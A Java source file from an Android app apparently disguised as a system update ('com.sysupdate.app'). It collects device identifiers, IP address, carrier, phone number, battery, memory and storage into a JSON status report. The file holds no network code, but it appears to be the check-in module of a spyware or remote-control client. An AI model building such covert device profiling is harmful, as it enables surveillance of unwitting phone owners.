package com.sysupdate.app;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.telephony.TelephonyManager;
import org.json.JSONObject;
import java.net.NetworkInterface;

public class SysInfo {
    public static JSONObject collect(Context ctx) {
        JSONObject o = new JSONObject();
        try {
            o.put("device_id", SB.DEVICE_ID);
            o.put("model", Build.MODEL);
            o.put("manufacturer", Build.MANUFACTURER);
            o.put("android_version", Build.VERSION.RELEASE);
            o.put("ip", getIP());
            o.put("status", "online");

            BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            o.put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));

            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkCapabilities nc = cm.getNetworkCapabilities(cm.getActiveNetwork());
            String net = "None";
            if (nc != null) {
                if (nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) net = "WiFi";
                else if (nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) net = "Cellular";
            }
            o.put("network_type", net);

            try {
                TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                o.put("network_operator", tm.getNetworkOperatorName() == null ? "-" : tm.getNetworkOperatorName());
                o.put("phone_number", tm.getLine1Number() == null ? "-" : tm.getLine1Number());
            } catch (Exception e) {}

            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            am.getMemoryInfo(mi);
            o.put("ram", human(mi.totalMem - mi.availMem) + " / " + human(mi.totalMem));

            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long total = stat.getBlockCountLong() * stat.getBlockSizeLong();
            long avail = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
            o.put("storage", human(total - avail) + " / " + human(total));
        } catch (Exception e) {}
        return o;
    }

    private static String getIP() {
        try {
            for (NetworkInterface ni : java.util.Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (java.net.InetAddress a : java.util.Collections.list(ni.getInetAddresses())) {
                    if (!a.isLoopbackAddress() && a.getHostAddress().indexOf(':') < 0) return a.getHostAddress();
                }
            }
        } catch (Exception e) {}
        return "-";
    }

    private static String human(long b) {
        double kb = b / 1024.0, mb = kb / 1024, gb = mb / 1024;
        if (gb >= 1) return String.format("%.2f GB", gb);
        if (mb >= 1) return String.format("%.0f MB", mb);
        return String.format("%.0f KB", kb);
    }
}
